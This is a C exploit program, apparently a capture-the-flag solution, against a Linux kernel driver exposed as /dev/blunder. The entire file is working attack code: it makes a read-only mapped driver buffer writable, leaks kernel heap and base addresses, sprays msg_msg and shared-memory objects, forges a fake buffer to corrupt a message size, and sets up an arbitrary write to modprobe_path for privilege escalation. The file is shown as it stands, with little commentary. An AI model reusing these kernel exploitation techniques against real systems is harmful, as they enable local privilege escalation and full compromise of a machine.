#define _GNU_SOURCE

#include <sys/shm.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <stdlib.h>


#define IPC "/dev/blunder"
#define IOCTL_BLUNDER_SET_CTX   _IOWR('s', 1, uint64_t)
#define IOCTL_BLUNDER_SEND_MSG  _IOWR('s', 2, struct blunder_user_message)
#define IOCTL_BLUNDER_RECV_MSG  _IOWR('s', 3, struct blunder_user_message)

#define INIT_IPC_NS 0xc5e0
#define INIT_IPC_NS_OFF 0x169c5e0 
#define MODPROBE_PATH_OFF 0x16445c0


static int qids[5];
static int shmids[100];
static int fds[100];
static void *shmaddr[100];
static unsigned long kbase = 0x0;
static unsigned long modprobe_path = 0x0;

struct blunder_user_message{
        int handle;
        int opcode;
        void *data;
        size_t data_size;
        size_t *offsets;
        size_t offsets_size;
        int *fds;
        size_t num_fds;
};

struct blunder_buffer{
        unsigned long blunder_buffer_next;
        unsigned long blunder_buffer_prev;
        size_t free;
        size_t buffer_size;
        size_t data_size;
        size_t offsets_size;
        unsigned char data[0];
};

int blunder_send_message(int fd, void *data, size_t data_size, int *fds, size_t num_fds){
        struct blunder_user_message umsg  = {
                .handle = getpid(),
                .opcode = 0x0,
                .data = data,
                .data_size = data_size,
                .offsets = NULL,
                .offsets_size = 0x0,
                .fds = fds,
                .num_fds = num_fds,
        };
        ioctl(fd, IOCTL_BLUNDER_SEND_MSG, &umsg);
}

void send_msg(int qid, long type, int size, int c){
        struct msgbuf{
                long mtype;
                char mtext[size];
        }msg;

        msg.mtype = type;
        memset(msg.mtext, c, sizeof(msg.mtext));

        if(msgsnd(qid, &msg, sizeof(msg.mtext), IPC_NOWAIT) == -1){
                perror("msgsnd:");
                _exit(-1);
        }
}

//spray the msg_msg objects of a variable size on the heap
void msg_msg_spray(void){
        for(int i = 0;i < sizeof(qids)/sizeof(int); i++){
                if ((qids[i] = msgget(IPC_PRIVATE, IPC_CREAT|0666)) < 0){
                        perror("msgget");
                        _exit(-1);
                }
        }

        //send messages via all the allocated ques
        for(int ii = 0;ii < sizeof(qids)/sizeof(int); ii++){
                send_msg(qids[ii], (ii + 1), 0xfe8, (0x41 + ii));
        } 

}

//This is used to receive messages from the message queue
void *recv_msg(int qid, size_t size){
        void *mem = malloc(size);

        int ret = msgrcv(qid, mem, size, 0, IPC_NOWAIT|MSG_COPY|MSG_NOERROR);

        if(ret == -1){
                perror("msgrcv");
                _exit(-1);
        }

        //fprintf(stderr, "[+] 'msgrcv' received %d bytes!\n" ,ret);
        return mem;
}

void alloc_shm(int idx){
        shmids[idx] = shmget(IPC_PRIVATE, 0x1000, IPC_CREAT|0600);
        if (shmids[idx] < 0){
                perror("shmget");
                _exit(-1);
        }

        shmaddr[idx] = (void *) shmat(shmids[idx], NULL, SHM_RDONLY);
        if(shmids[idx] < 0){
                perror("shmat");
                _exit(-1);
        }
}

void kill_shm(int idx){
        shmdt(shmaddr[idx]);
        shmctl(shmids[idx], IPC_RMID, NULL);
}

void leak_address(void){
        for(int i = 0; i < sizeof(qids)/sizeof(int); i++){
                unsigned long *mem = (unsigned long *) recv_msg(qids[i], 0x2000);
                if (mem == NULL)
                        continue;
                for(int i = 0;i < 0x400; i++){
                        if((mem[i] & 0xffff) == INIT_IPC_NS){
                                kbase = mem[i] - INIT_IPC_NS_OFF;
                                fprintf(stderr, "[+] Kbase: 0x%lx\n", kbase);

                                return;
                        }
                }
                fprintf(stderr, "[+] No Kernel address leaked\n");
                _exit(-1);
        }
}


int main(int argc, char **argv){
        int fd = open(IPC, O_RDWR);
        if(fd < 0){
                fprintf(stderr, "[!] Error opening device file!\n");
                _exit(-1);
        }
        fprintf(stderr, "[+] open'd /dev/blunder for O_RDWR\n");

        unsigned long *addr = (unsigned long *) mmap(NULL, 0x1000, PROT_READ, MAP_SHARED, fd, 0);
        fprintf(stderr, "[+] mmap'd address: %p\n", addr);

        //Change the protection of the mmap'd address to READ_WRITE
        int mp = mprotect(addr, 0x1000, PROT_WRITE|PROT_READ);
        if(mp){
                fprintf(stderr, "[-] mprotect error!\n");
                _exit(-1);
        }

        fprintf(stdout, "[+] mprotect'd address success!\n");

        //send a message to split the buffer 
        int fds[] = {1337};
        unsigned char buffer [0x10]; 
        memset(buffer, 0x41, sizeof(buffer));


        //send the buffer 
        blunder_send_message(fd, buffer, sizeof(buffer), fds, sizeof(fds)/sizeof(fd));

        unsigned long leaked_heap_address = (unsigned long) addr[0];
        fprintf(stderr, "[+] Leaked Kernel Heap address: 0x%lx\n", leaked_heap_address);

        for(int i = 0; i < 50;i++)
                alloc_shm(i);

        fprintf(stderr, "[+] Spraying 'msg_msg' objects!\n");
        msg_msg_spray();


        for(int i = 50; i < 100; i++)
                alloc_shm(i);


        unsigned long fake_blunder_buffer = (leaked_heap_address - 0x40) + 0xfc0;
        fprintf(stderr, "[+] Fake blunder_buffer: 0x%lx\n", fake_blunder_buffer);

        //overwriting our current->next with the fake chunk
        addr[0] = fake_blunder_buffer;

        //update the fake buffer
        int off = 0x1fa;
        addr[off++] = (unsigned long) 0x1; //atomic_free
        addr[off++] = (unsigned long) 0x30; //buffer_size
        addr[off++] = (unsigned long) 0x30; //data_size

        unsigned long overflow[0x6];
        memset(overflow, 0x42, 2 * sizeof(unsigned long)); //overflow into the allocated buffer


        overflow[0x4] = (unsigned long) 0xdeadbeef; //m_type
        overflow[0x5] = (unsigned long) 0x2000; //m_ts with a bigger value

        blunder_send_message(fd, overflow, sizeof(overflow), fds, sizeof(fds)/sizeof(fd));

        //Leak address in the kmalloc-32 to find INIT_IPC_NS
        leak_address();

        modprobe_path = kbase + MODPROBE_PATH_OFF;

        fprintf(stdout, "[+] Modprobe Path: 0x%lx\n", modprobe_path);

        //For AAW write the address of modprobe path as the fake blunder_buffer chunk
        addr[0] = (unsigned long) (modprobe_path - sizeof(struct blunder_buffer));

        for(int i = 0;i < 100; i++)
                kill_shm(i);
        getchar();

        return 0;
}
